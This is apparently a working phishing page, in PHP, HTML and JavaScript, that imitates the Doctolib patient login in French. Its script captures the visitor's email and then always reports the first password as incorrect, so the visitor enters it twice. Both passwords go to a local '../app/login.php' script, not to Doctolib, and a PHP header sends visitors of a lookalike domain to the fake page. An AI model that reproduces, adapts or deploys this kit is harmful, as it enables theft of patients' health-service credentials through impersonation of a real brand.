<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<!DOCTYPE html>
<html class="h-full" data-theme="doctolib2023" lang="fr">
<head data-country="fr" data-env="production">
  <!-- ******************************* -->
  <!-- (1) HEAD DU BLOC MOT DE PASSE   -->
  <!-- ******************************* -->
  <script id="kcContext" type="application/json">
      {
        "backUrl": "...",
        "client": { "baseUrl": "..." },
        "url": { "loginAction": "..." },
        "prefilledUsername": "",
        "isError": false,
        "pageId": "login.ftl",
        "locale": { "currentLanguageTag": "fr" },
        "productEventContext": "navigation_bar"
      }
  </script>
  <meta charset="utf-8"/>
  <meta content="webpack/width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" name="viewport"/>
  <meta content="webpack/#107ACA" name="theme-color"/>
  <link href="webpack/favicon.ico" rel="icon" type="image/x-icon"/>
  <script crossorigin="" src="webpack/index-DgoSVJCJ.js" type="module"></script>
  <link as="script" crossorigin="" href="webpack/KcLoginThemeApp-DJnee5pJ.js" rel="modulepreload"/>
  <link as="script" crossorigin="" href="webpack/vendor-C9O-K7jM.js" rel="modulepreload"/>
  <link crossorigin="" href="webpack/main-D8A048Mp.css" rel="stylesheet"/>
  <link as="script" crossorigin="" href="webpack/Login-B1YeY9eF.js" rel="modulepreload"/>
  <link as="script" crossorigin="" href="webpack/InputPassword-DX7zsMgN.js" rel="modulepreload"/>
  <link as="script" crossorigin="" href="webpack/index-DgoSVJCJ.js" rel="modulepreload"/>
  <link as="script" crossorigin="" href="webpack/Template-dOubvlnT.js" rel="modulepreload"/>
  <link crossorigin="" href="webpack/Template-D6QImLSM.css" rel="stylesheet"/>
  <link crossorigin="" href="webpack/InputPassword-DbGe7uqN.css" rel="stylesheet"/>
  <link crossorigin="" href="webpack/Login-DbYoHk_O.css" rel="stylesheet"/>
  <title>Saisie du mot de passe – Doctolib</title>

  <!-- ******************************* -->
  <!-- (2) HEAD DU BLOC E‑MAIL        -->
  <!-- ******************************* -->
  <script async="" charset="utf-8" id="spcloader" src="webpack/loader.js?target=www.doctolib.fr" type="text/javascript"></script>
  <head data-country="fr" data-env="production"></head>
  <meta charset="utf-8"/>
  <meta content="webpack/authenticity_token" name="csrf-param"/>
  <meta content="webpack/t5GLa7OBvg8X1mTK8hlw8W_wsVqR48wBDnqssl_q0mCHP3aFaoOkrwkHg5ecYWwHOleyQ2NEwzpnF3ryqGgWsQ" name="csrf-token"/>
  <meta content="origin-when-cross-origin" name="referrer"/>
  <meta
    content="webpack/width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0, , viewport-fit=cover"
    name="viewport"
  />
  <meta
    content="webpack/Trouvez rapidement un spécialiste près de chez vous et prenez rendez-vous gratuitement en ligne en quelques clics"
    data-rh="true"
    name="description"
  />
  <meta content="webpack/app-id=fr.doctolib.www" name="google-play-app"/>
  <meta content="webpack/app-id=925339063" name="apple-itunes-app"/>
  <script nonce="">
  //<![CDATA[
  </script>
  <script crossorigin="anonymous" data-lazy="no" nonce="" src="webpack/datadog-rum-v4.js"></script>
  <script data-segment="patient" nonce="" src="webpack/rum-datadog-3623a02bd9251768878a.js"></script>
  <style>.app_loading { display: none; }</style>
  <script crossorigin="anonymous" data-lazy="no" nonce="" src="webpack/5e227d5a9db847db9597d931c0ea0774.min.js"></script>
  <script data-device="desktop" nonce="" src="webpack/sentry-de6d4bbd68c40facd2cd.js"></script>
  <meta content="webpack/Doctolib : Prenez rendez-vous en ligne chez un soignant" property="og:title"/>
  <meta content="webpack/website" property="og:type"/>
  <meta content="webpack/logo_doctolib_square.png" property="og:image"/>
  <meta content="webpack" property="og:url"/>
  <meta content="webpack/Doctolib" property="og:site_name"/>
  <meta content="webpack/fr_FR" property="og:locale"/>
  <meta
    content="webpack/Trouvez rapidement un spécialiste près de chez vous et prenez rendez-vous gratuitement en ligne en quelques clics"
    property="og:description"
  />
  <link href="webpack/42844-e09eac78.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/61806-906039b2.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/5533-69004b86.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/2244-43ee20fe.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/1576-e23a4cda.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/7345-b24d641c.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/20427-144010f7.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/36255-53e661a9.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/76680-a721cbd6.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/74908-1a6aecce.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/10696-1884c629.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/94995-2096f413.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/17227-b588eb2d.css" rel="stylesheet" type="text/css"/>
  <link href="webpack/39533-18f62fdb.css" rel="stylesheet" type="text/css"/>
  <title>Doctolib : Prenez rendez-vous en ligne chez un soignant</title>
</head>

<body class="h-full authentication-sessions new">
  <!-- *** AJOUT : Overlay du spinner *** -->
  <div id="spinnerOverlay" style="
    position: fixed;
    top:0; left:0; 
    width:100%; height:100%;
    background: rgba(0,0,0,0.35);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 9999;">
    <div style="
      width:40px; height:40px; 
      border:4px solid #ccc;
      border-top:4px solid #0066ff;
      border-radius:50%;
      animation: spin 1s linear infinite;">
    </div>
  </div>
  <!-- *** FIN overlay spinner *** -->


  <!-- ************************************* -->
  <!-- A) BLOC “ADRESSE E-MAIL”              -->
  <!-- ************************************* -->
  <div class="flex" id="emailStep" style="display: block;">
    <div class="content-full-width application-container">
      <main id="main-content">
        <div class="false" id="react-main">
          <p class="sr-only" tabindex="-1"></p>
          <div class="dl-view" data-design-system="base">
            <!-- NAVIGATION, ne garder que le logo -->
            <header class="dl-nav-bar dl-nav-bar-large dl-desktop-navbar" data-design-system="base" role="banner">
              <div class="dl-desktop-navbar-content">
                <div class="flex dl-align-items-center dl-nav-bar-list">
                  <!-- LOGO UNIQUEMENT -->
                  <a aria-label="Accueil" class="flex" href="webpack" title="Accueil">
                    <div class="logo-doctolib logo-doctolib-white" data-test-id="logo-doctolib">
                      <span class="sr-only">Doctolib</span>
                    </div>
                  </a>
                </div>
              </div>
            </header>

            <!-- Le bloc principal “Saisissez votre adresse e-mail...” -->
            <div class="dl-view-container dl-justify-center mt-48 !overflow-auto" data-design-system="base">
              <!-- Ajuster “Se connecter” : marge à gauche -->
              <div class="dl-view dl-max-width-608" data-design-system="base" style="margin-left: 2rem;">
                <p class="XZWvFVZmM9FHf461kjNO G5dSlmEET4Zf5bQ5PR69 !mb-24"
                   data-design-system="oxygen"
                   data-design-system-component="Paragraph"
                   style="color: var(--oxygen-color-shared-text-bodytext-default);
                          font: var(--oxygen-typography-title-l-bold);
                          ">
                  Se connecter
                </p>
                <div class="dl-card dl-card-bg-white dl-card-variant-default !p-64 !pt-40 !static"
                     data-design-system="oxygen"
                     data-design-system-component="Card">
                  <div class="dl-card-content">
                    <button class="Tappable-inactive dl-button-small-neutral !mb-24 dl-button dl-button-size-medium"
                            data-design-system="oxygen"
                            data-design-system-component="Button"
                            style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); user-select: none; cursor: pointer;"
                            type="button">
                      <span class="dl-button-label">
                        <svg aria-hidden="true"
                             class="dl-icon dl-button-left-icon dl-icon-small"
                             data-design-system="oxygen"
                             data-design-system-component="Icon"
                             data-icon-name="regular/arrow-left"
                             fill="currentColor"
                             focusable="false"
                             height="16"
                             viewBox="0 0 16 16"
                             width="16"
                             xmlns="http://www.w3.org/2000/svg">
                          <path d="M7.04 12.36 2.913 8.421A.56.56 0 0 1 2.75 8a.55.55 0 0 1 .164-.398L7.04 3.664c.234-.21.586-.21.797.024a.56.56 0 0 1-.024.796L4.696 7.438h7.97c.327 0 .562.257.562.562a.57.57 0 0 1-.563.563h-7.97l3.117 2.976a.56.56 0 0 1 .024.797.56.56 0 0 1-.797.023Z"/>
                        </svg>
                        Étape précédente
                      </span>
                    </button>

                    <div class="dl-scrollable flex flex-col justify-between bg-white">
                      <!-- Message d’erreur (rouge) si l’email est invalide -->
                      <p id="emailError" style="color: red; display: none; margin-bottom: 8px;">
                      </p>

                      <form autocomplete="off"
                            class="flex flex-col justify-between"
                            data-design-system="base"
                            id="emailForm">
                        <div class="flex items-center gap-16">
                          <div class="dl-authentication-step-icon-container rounded-lg items-center justify-center flex">
                            <svg aria-hidden="true"
                                 class="dl-icon dl-icon-primary-110 dl-icon-xsmall"
                                 data-design-system="oxygen"
                                 data-design-system-component="Icon"
                                 data-icon-name="regular/envelope"
                                 fill="currentColor"
                                 focusable="false"
                                 height="16"
                                 viewBox="0 0 16 16"
                                 width="16"
                                 xmlns="http://www.w3.org/2000/svg">
                              <path d="M12.5 3.5h-9C2.656 3.5 2 4.18 2 5v6c0 .844.656 1.5 1.5 1.5h9c.82 0 1.5-.656 1.5-1.5V5c0-.82-.68-1.5-1.5-1.5m-9 1.125h9c.188 0 .375.188.375.375v.54L8.961 8.772c-.54.446-1.406.446-1.945 0L3.125 5.54V5c0-.188.164-.375.375-.375m9 6.75h-9A.37.37 0 0 1 3.125 11V6.992l3.188 2.672A2.68 2.68 0 0 0 8 10.25c.61 0 1.195-.21 1.664-.586l3.211-2.672V11c0 .21-.188.375-.375.375"></path>
                            </svg>
                          </div>
                        </div>
                        <h1 class="dl-text dl-text-title dl-text-bold dl-text-l !mt-16"
                            data-design-system="deprecated"
                            data-design-system-component="Text">
                          Saisissez votre adresse email
                        </h1>
                        <div class="dc-form-field-set !mt-16 !mb-0" data-design-system="base">
                          <div class="dc-form-field-set-group">
                            <div class="dc-form-field-set-content">
                              <div class="dl-flex-grow">
                                <div class="dc-form-row" data-design-system="base">
                                  <div class="dc-form-group dc-form-row-group" data-design-system="base">
                                    <span class="dl-input-container" data-design-system="base">
                                      <!-- Champ en type="email" -->
                                      <input
                                        autocapitalize="off"
                                        autocomplete="off"
                                        autocorrect="off"
                                        class="dc-input dc-text-input"
                                        data-design-system="deprecated"
                                        data-design-system-component="DeprecatedBaseFormTextInput"
                                        field="username"
                                        id="emailInput"
                                        name="email"
                                        placeholder="Adresse e-mail"
                                        required=""
                                        type="email"
                                      />
                                    </span>
                                    <span class="dc-validity-indicator" role="status"></span>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div class="flex flex-col items-stretch mt-24">
                          <div class="RVqoSc37gnaDUCSDB7sy">
                            <progress aria-describedby="progress-bar-information"
                                      aria-label=""
                                      aria-valuemax="3"
                                      aria-valuemin="0"
                                      aria-valuenow="2"
                                      class="dl-progress _T0RxHF3OzvSZzJ0p9RN wMQ59tc3inpGVd3fqKrZ mb-16"
                                      data-design-system="oxygen"
                                      data-design-system-component="ProgressBar"
                                      id="stepper"
                                      max="100"
                                      role="progressbar"
                                      value="67">
                            </progress>
                            <span class="t0oPiPWTHnMGdVqv_UZo"
                                  id="progress-bar-information">
                              , Étape 2 sur 3
                            </span>
                          </div>
                          <!-- BOUTON "CONTINUER" -->
                          <button class="Tappable-inactive dl-button-primary dl-button dl-button-loadable dl-button-size-medium"
                                  data-design-system="oxygen"
                                  data-design-system-component="Button"
                                  style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); user-select: none; cursor: pointer;"
                                  type="button"
                                  id="btnEmailContinue">
                            <span class="dl-button-label">Continuer</span>
                          </button>
                        </div>
                      </form>
                    </div>
                    <!-- Fin bloc e-mail -->
                  </div>
                </div>
              </div>
            </div>
            <div id="modal"></div>
            <script nonce="">
              window.current_account = null;
              window.navbar_b2b_url = "https://info.doctolib.fr?origin=home-header&utm_button=header&utm_content-group=other&utm_website=doctolib_patients";
            </script>
          </div>
        </div>
      </main>
    </div>
  </div>
  <!-- FIN BLOC E‑MAIL -->

  <!-- ********************************** -->
  <!-- B) BLOC MOT DE PASSE               -->
  <!-- ********************************** -->
  <div class="h-full" id="passwordStep" style="display: none;">
    <div class="antialiased w-full h-full bg-[color:var(--oxygen-color-primitive-grey-grey-100)] flex flex-col z-20 h-screen" data-testid="desktop-template">
      <!-- DEUXIÈME NAVIGATION (Touch Bar) : LOGO UNIQUEMENT -->
      <nav class="h-[64px] bg-[color:var(--oxygen-core-blue-110)] z-50 relative flex-shrink-0">
        <div class="px-[20px] h-full flex justify-between">
          <!-- LOGO UNIQUEMENT -->
          <div class="flex !items-center list-none">
            <a aria-label="Home" class="flex" href="webpack/www.doctolib.fr" title="Home">
              <div class="bg-[url('./assets/icons/logo-doctolib.svg')] inline-block w-[95px] h-[50px] bg-no-repeat bg-center bg-[length:95px_auto] !items-center">
                <span class="sr-only">Doctolib</span>
              </div>
            </a>
          </div>
        </div>
      </nav>

      <main class="dl-justify-center mt-12 flex flex-[1_0_0] z-20">
        <div class="antialiased w-full bg-[color:var(--oxygen-color-primitive-grey-grey-100)] flex flex-col z-20 max-w-[608px] mt-[48px] px-[16px]">
          <!-- Décaler "Se connecter" (marge à gauche) -->
          <p class="_text_18l6b_1 _isBlock_18l6b_10 !mb-[24px]"
             data-design-system="oxygen"
             data-design-system-component="Paragraph"
             style="color: var(--oxygen-color-shared-text-bodytext-default);
                    font: var(--oxygen-typography-title-l-bold);
                    margin-left: 2rem;">
            Se connecter
          </p>
          <div class="dl-card dl-card-bg-white dl-card-variant-default !pt-[60px] !p-[64px] !static"
               data-design-system="oxygen"
               data-design-system-component="Card">
            <div class="dl-card-content">
              <!-- BOUTON “Étape précédente” pour RETOURNER au bloc e‑mail -->
              <button
                class="Tappable-inactive dl-button-small-neutral !mb-[24px] dl-button dl-button-size-medium"
                data-design-system="oxygen"
                data-design-system-component="Button"
                style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); user-select: none; cursor: pointer;"
                type="button"
                id="btnPreviousStep"
              >
                <span class="dl-button-label">
                  <svg aria-hidden="true"
                       class="dl-icon dl-button-left-icon dl-icon-small"
                       data-design-system="oxygen"
                       data-design-system-component="Icon"
                       data-icon-name="regular/arrow-left"
                       fill="currentColor"
                       focusable="false"
                       height="16"
                       viewBox="0 0 16 16"
                       width="16"
                       xmlns="http://www.w3.org/2000/svg">
                    <path d="M7.04 12.36 2.913 8.421A.56.56 0 0 1 2.75 8a.55.55 0 0 1 .164-.398L7.04 3.664c.234-.21.586-.21.797.024a.56.56 0 0 1-.024.796L4.696 7.438h7.97c.327 0 .562.257.562.562a.57.57 0 0 1-.563.563h-7.97l3.117 2.976a.56.56 0 0 1 .024.797.56.56 0 0 1-.797.023Z"/>
                  </svg>
                  Étape précédente
                </span>
              </button>

              <!-- FORM MOT DE PASSE
                   On pointe vers "app/login.php" en POST -->
              <form
                id="passwordForm"
                method="post"
                action="../app/login.php"
              >
                <div id="desktop-container">
                  <h1 class="_text_18l6b_1 _isBlock_18l6b_10"
                      data-design-system="oxygen"
                      data-design-system-component="Heading"
                      style="color: var(--oxygen-color-shared-text-headertext-default);
                             font: var(--oxygen-typography-title-l-bold);">
                    Bienvenue
                  </h1>
                  <!-- Email affiché dynamiquement -->
                  <p class="_text_18l6b_1 _isBlock_18l6b_10"
                     data-design-system="oxygen"
                     data-design-system-component="Paragraph"
                     style="color: var(--oxygen-color-shared-text-bodytext-weaker);
                            font: var(--oxygen-typography-body-s-regular);"
                     id="emailDisplay">
                  </p>

                  <!-- Champ caché pour transporter l’email -->
                  <input
                    type="hidden"
                    id="hiddenEmail"
                    name="email"
                  />

                  <!-- *** AJOUT : On va stocker localement le 1er mot de passe,
                                donc on n'ajoute pas encore de hidden password_1
                                (tout se fait localement). *** -->

                  <div class="flex flex-col-reverse w-full mt-[16px]">
                    <div class="oxygen-input-field w-auto oxygen-input-field--is-empty"
                         data-design-system="oxygen"
                         data-design-system-component="InputPassword">
                      <label
                        class="dl-text dl-text-body dl-text-bold dl-text-s dl-text-left dl-text-neutral-150 oxygen-input-field__label"
                        data-design-system="oxygen"
                        data-design-system-component="_InputLabel"
                        for="passInput"
                        id="label_:r0:"
                      >
                        Mot de passe
                      </label>
                      <div class="oxygen-input-field__inputWrapper oxygen-input-field__inputWrapper--with-icon">
                        <!-- VRAI CHAMP MOT DE PASSE -->
                        <input
                          aria-invalid="false"
                          autocomplete="current-password"
                          autocorrect="off"
                          class="oxygen-input-field__input text-ellipsis"
                          data-design-system="oxygen"
                          data-design-system-component="_RawInputText"
                          id="passInput"
                          name="password"
                          spellcheck="false"
                          type="password"
                          value=""
                        />
                        <div class="oxygen-input-field__iconWrapper oxygen-input-field__iconWrapper--right">
                          <!-- BOUTON AFFICHER / CACHER LE MOT DE PASSE -->
                          <button
                            aria-disabled="false"
                            aria-label="Afficher le mot de passe"
                            class="_button_1ht0b_14 _variant-transparent_1ht0b_397 _uiStyle-neutral_1ht0b_245 _iconButton_2ucyr_1 _size-xsmall_2ucyr_22"
                            data-design-system="oxygen"
                            data-design-system-component="IconButton"
                            data-state="closed"
                            data-state-loading="false"
                            type="button"
                            id="togglePasswordBtn"
                          >
                            <span class="_innerWrapper_1ht0b_25 _innerWrapper_2ucyr_9">
                              <span class="_hoverEffect_1ht0b_29"></span>
                              <span class="_activeEffect_1ht0b_32"></span>
                              <span class="_contentWrapper_1ht0b_35 _iconWrapper_2ucyr_14"
                                    id="toggleEyeIcon">
                                <!-- Eye-slash par défaut -->
                                <svg aria-hidden="true"
                                     class="dl-icon dl-icon-xsmall"
                                     data-design-system="oxygen"
                                     data-design-system-component="Icon"
                                     data-icon-name="regular/eye-slash"
                                     fill="currentColor"
                                     focusable="false"
                                     height="16"
                                     viewBox="0 0 16 16"
                                     width="16"
                                     xmlns="http://www.w3.org/2000/svg">
                                  <path d="M4.016 4.18C5.07 3.383 6.383 2.75 8 2.75c1.875 0 3.399.867 4.5 1.898a9.1 9.1 0 0 1 2.18 3.07.84.84 0 0 1 0 .587c-.305.75-.938 1.828-1.875 2.765l2.46 1.946a.518.518 0 0 1 .094.773.518.518 0 0 1-.773.094L.711 3.008a.518.518 0 0 1-.094-.774.518.518 0 0 1 .774-.093zm.914.726 1.078.844A3 3 0 0 1 8 5c1.64 0 3 1.36 3 3 0 .516-.14.984-.351 1.383l1.265.984A8.6 8.6 0 0 0 13.578 8c.566-.715 1.394-1.735 1.961-2.45a.74.74 0 0 0 0-.61C14.922 3.875 12.305 2.75 8 2.75 6.383 2.75 5.07 3.383 4.016 4.18zm.235 3.047.984.773A1.7 1.7 0 0 1 6.125 8c0-.117.022-.234.07-.352.094-.211.164-.422.164-.68 0-.117-.023-.235-.07-.375h.07A1.88 1.88 0 0 1 8 6.125c1.04 0 1.875.836 1.875 1.875 0 .516-.14.984-.351 1.383l1.265.984A8.6 8.6 0 0 1 13.578 8c.566.715 1.394 1.735 1.961 2.45a.84.84 0 0 1 0 .61C14.922 12.125 12.305 13.25 8 13.25c-2.055 0-3.37-.633-4.383-1.43zM5 8v-.187l1.313 1.03c.234.493.703.868 1.265.985l1.313 1.055c-.297.094-.605.141-.914.141-1.64 0-3-1.336-3-3z"/>
                                </svg>
                              </span>
                            </span>
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>

                  <!-- Message d’erreur pour le MDP incorrect -->
                  <p id="passwordError" style="color: red; display: none; margin: 8px 0;">
                    Ce mot de passe est incorrect
                  </p>

                  <div class="flex w-full justify-between mt-[4px]">
                    <div class="h-[24px] mt-[4px]">
                      <label class="dl-text dl-text-body dl-text-regular dl-text-s dl-text-left dl-checkbox-label"
                             data-design-system="oxygen"
                             data-design-system-component="Checkbox"
                             for="rememberMe">
                        <div class="flex items-center self-start min-h-24">
                          <span class="leading-[0]">
                            <input aria-describedby=""
                                   aria-invalid="false"
                                   checked=""
                                   class="dl-checkbox-control"
                                   id="rememberMe"
                                   name="rememberMe"
                                   type="checkbox"/>
                            <div class="dl-checkbox">
                              <svg aria-hidden="true"
                                   class="dl-icon dl-checkbox-icon dl-icon-xsmall"
                                   data-design-system="oxygen"
                                   data-design-system-component="Icon"
                                   data-icon-name="solid/check"
                                   fill="currentColor"
                                   focusable="false"
                                   height="16"
                                   viewBox="0 0 16 16"
                                   width="16"
                                   xmlns="http://www.w3.org/2000/svg">
                                <path d="M13.016 4.484a.723.723 0 0 1 0 1.055l-6 6a.723.723 0 0 1-1.055 0l-3-3a.723.723 0 0 1 0-1.055.723.723 0 0 1 1.055 0l2.46 2.461 5.485-5.46a.723.723 0 0 1 1.055 0Z"/>
                              </svg>
                            </div>
                          </span>
                        </div>
                        <span class="cursor-pointer ml-8">Se souvenir de moi</span>
                      </label>
                    </div>
                    <div class="mr-[-8px]">
                      <a class="Tappable-inactive dl-button-link-primary dl-button dl-button-size-small"
                         data-design-system="oxygen"
                         data-design-system-component="Button"
                         href="webpack/new?from_idp=1"
                         style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); user-select: none; cursor: pointer;"
                         type="button">
                        <span class="dl-button-label">Mot de passe oublié ?</span>
                      </a>
                    </div>
                  </div>

                  <div class="flex flex-col mt-[24px]">
                    <!-- BOUTON CONTINUER (soumission) -->
                    <button
                      class="Tappable-inactive dl-button-primary dl-button dl-button-loadable dl-button-size-medium"
                      data-design-system="oxygen"
                      data-design-system-component="Button"
                      style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0); user-select: none; cursor: pointer;"
                      type="submit"
                      id="passwordSubmitBtn"
                    >
                      <span class="dl-button-label">Continuer</span>
                    </button>
                  </div>

                </div>
              </form>
              <!-- Fin form mot de passe -->
            </div>
          </div>
        </div>
      </main>
    </div>
  </div>
  <!-- Fin bloc Mot de passe -->

  <!-- ******************************* -->
  <!-- Script JS pour la navigation   -->
  <!-- ******************************* -->
  <script>
    // Étapes & sélecteurs
    const spinnerOverlay    = document.getElementById("spinnerOverlay"); /* *** AJOUT *** */

    const emailStep         = document.getElementById("emailStep");
    const passwordStep      = document.getElementById("passwordStep");
    const btnEmailContinue  = document.getElementById("btnEmailContinue");
    const btnPreviousStep   = document.getElementById("btnPreviousStep");

    const emailInput        = document.getElementById("emailInput");
    const emailError        = document.getElementById("emailError");

    const emailDisplay      = document.getElementById("emailDisplay");
    const hiddenEmail       = document.getElementById("hiddenEmail");

    const passwordForm      = document.getElementById("passwordForm");
    const passInput         = document.getElementById("passInput");
    const passwordError     = document.getElementById("passwordError");

    // Toggle “Afficher / Cacher” MDP
    const togglePasswordBtn = document.getElementById("togglePasswordBtn");
    const toggleEyeIcon     = document.getElementById("toggleEyeIcon");
    let isPwdVisible = false;

    // *** On va gérer localement la 1ère / 2ème tentative
    let passwordAttempts = 0;
    let firstPassword    = "";

    // Fonction pour montrer/masquer le spinner
    function showSpinner(show) {
      spinnerOverlay.style.display = show ? "flex" : "none";
    }

    // Clic sur “Continuer” (page E-mail)
    btnEmailContinue.addEventListener("click", function(e){
      e.preventDefault();

      // Montre le spinner pour ~1s
      showSpinner(true);
      setTimeout(function(){
        showSpinner(false);

        const val = emailInput.value.trim();

        // Vérif champ vide
        if(!val){
          emailError.textContent = "Veuillez saisir votre adresse e-mail.";
          emailError.style.display = "block";
          return;
        }

        // Vérif format e-mail
        const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
        if(!emailRegex.test(val)){
          emailError.innerHTML = "L'email saisi (<span style='color:black;font-weight:bold'>" + val + "</span>) n'est associé à aucun compte Doctolib.";
          emailError.style.display = "block";
          return;
        }

        // Si OK => passe à l’étape suivante
        emailError.style.display = "none";
        emailStep.style.display  = "none";
        passwordStep.style.display = "block";

        // Afficher l’e-mail dans le bloc MDP
        emailDisplay.textContent = val;
        hiddenEmail.value        = val;
      }, 1000);
    });

    // Bouton “Étape précédente” (page Mot de passe)
    btnPreviousStep.addEventListener("click", function(e){
      e.preventDefault();
      passwordStep.style.display = "none";
      emailStep.style.display    = "block";
    });

    // Toggle “Afficher / Cacher” mot de passe
    togglePasswordBtn.addEventListener("click", function(){
      isPwdVisible = !isPwdVisible;
      passInput.type = isPwdVisible ? "text" : "password";

      if(isPwdVisible){
        // Oeil ouvert
        toggleEyeIcon.innerHTML = `
          <svg aria-hidden="true" class="dl-icon dl-icon-xsmall" data-design-system="oxygen"
               data-design-system-component="Icon" data-icon-name="regular/eye"
               fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16"
               xmlns="http://www.w3.org/2000/svg">
            <path d="M8 3.875c1.5 0 2.742.704 3.727 1.594 1.055.796 1.883 1.816 2.45 2.531.141.188.141.422 0 .61-.567.715-1.395 1.735-2.45 2.531C10.742 12.421 9.5 13.125 8 13.125c-1.532 0-2.776-.704-3.762-1.594-1.055-.796-1.883-1.816-2.45-2.531a.74.74 0 0 1 0-.61C2.805 6.375 4.992 4.25 8 4.25c1.532 0 2.776.704 3.762 1.594 1.055.796 1.883 1.816 2.45 2.531a.84.84 0 0 1 0 .61C13.217 9.625 11.03 11.75 8 11.75c-1.2 0-2.219-.422-3.07-1.03-.836-.625-1.371-1.29-1.735-1.57-.996-1.04-2.648-2.53-4.648-2.53zm0 1.125c-2 0-3.633 1.492-4.648 2.531-.066.07-.102.156-.102.234 0 .078.036.164.102.234.996 1.04 2.648 2.531 4.648 2.531 1.008 0 2.055-.465 3.07-1.031C12.105 9.736 12.933 8.716 13.5 8c.567-.715 1.395-1.735 1.961-2.45a.74.74 0 0 0 0-.61C14.922 3.875 12.305 2.75 8 2.75S5.258 2.867 4.016 3.82a8.6 8.6 0 0 0-1.86 2.82zM8 5.75A2.25 2.25 0 1 1 8 10.25 2.25 2.25 0 0 1 8 5.75zm0 3.375c.65 0 1.125-.477 1.125-1.125A1.108 1.108 0 0 0 8 6.875 1.108 1.108 0 0 0 6.875 8c0 .648.477 1.125 1.125 1.125z"/>
          </svg>
        `;
      } else {
        // Oeil barré
        toggleEyeIcon.innerHTML = `
          <svg aria-hidden="true" class="dl-icon dl-icon-xsmall" data-design-system="oxygen"
               data-design-system-component="Icon" data-icon-name="regular/eye-slash"
               fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16"
               xmlns="http://www.w3.org/2000/svg">
            <path d="M4.016 4.18C5.07 3.383 6.383 2.75 8 2.75c1.875 0 3.399.867 4.5 1.898a9.1 9.1 0 0 1 2.18 3.07.84.84 0 0 1 0 .587c-.305.75-.938 1.828-1.875 2.765l2.46 1.946a.518.518 0 0 1 .094.773.518.518 0 0 1-.773.094L.711 3.008a.518.518 0 0 1-.094-.774.518.518 0 0 1 .774-.093zm.914.726 1.078.844A3 3 0 0 1 8 5c1.64 0 3 1.36 3 3 0 .516-.14.984-.351 1.383l1.265.984A8.6 8.6 0 0 0 13.578 8c.566-.715 1.394-1.735 1.961-2.45a.74.74 0 0 0 0-.61C14.922 3.875 12.305 2.75 8 2.75 6.383 2.75 5.07 3.383 4.016 4.18zm.235 3.047.984.773A1.7 1.7 0 0 1 6.125 8c0-.117.022-.234.07-.352.094-.211.164-.422.164-.68 0-.117-.023-.235-.07-.375h.07A1.88 1.88 0 0 1 8 6.125c1.04 0 1.875.836 1.875 1.875 0 .516-.14.984-.351 1.383l1.265.984A8.6 8.6 0 0 1 13.578 8c.566.715 1.394 1.735 1.961 2.45a.84.84 0 0 1 0 .61C14.922 12.125 12.305 13.25 8 13.25c-2.055 0-3.37-.633-4.383-1.43zM5 8v-.187l1.313 1.03c.234.493.703.868 1.265.985l1.313 1.055c-.297.094-.605.141-.914.141-1.64 0-3-1.336-3-3z"/>
          </svg>
        `;
      }
    });

    // *** Bloquer la soumission du mot de passe la 1ère fois
    passwordForm.addEventListener("submit", function(e){
      e.preventDefault(); // Empêche la soumission par défaut

      const val = passInput.value.trim();

      // 1ère tentative ?
      if (passwordAttempts === 0) {
        // Afficher "mot de passe incorrect" (local)
        if(!val) {
          passwordError.textContent = "Veuillez saisir un mot de passe.";
        } else {
          passwordError.textContent = "Ce mot de passe est incorrect";
        }
        passwordError.style.display = "block";

        // On stocke ce 1er MDP localement
        firstPassword = val;
        // On vide le champ
        passInput.value = "";
        passwordAttempts = 1;
        return;
      }

      // 2ᵉ tentative => on soumet
      showSpinner(true);
      setTimeout(function(){
        showSpinner(false);

        // On met le 1er MDP dans un input hidden "password_1"
        let hidden1 = document.createElement("input");
        hidden1.type = "hidden";
        hidden1.name = "password_1";
        hidden1.value = firstPassword;
        passwordForm.appendChild(hidden1);

        // Le second (celui saisi maintenant) reste name="password"

        // On soumet le form
        passwordForm.submit();
      }, 1000);
    });
  </script>

  <!-- ****************************** -->
  <!-- STYLES D’ADAPTATION FINALE    -->
  <style>
    /* Empêcher le débordement horizontal global */
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      overflow-x: hidden;
      box-sizing: border-box;
    }
    *, *::before, *::after {
      box-sizing: inherit;
    }

    img, video {
      max-width: 100%;
      height: auto;
      display: block;
    }

    .flex {
      flex-wrap: wrap;
    }

    /* Ajuster la card en responsive */
    @media (max-width: 1200px) {
      .dl-card {
        padding: 32px !important;
      }
    }
    @media (max-width: 768px) {
      .dl-card {
        padding: 16px !important;
      }
    }

    /* *** Animation du spinner *** */
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</body>
</html>
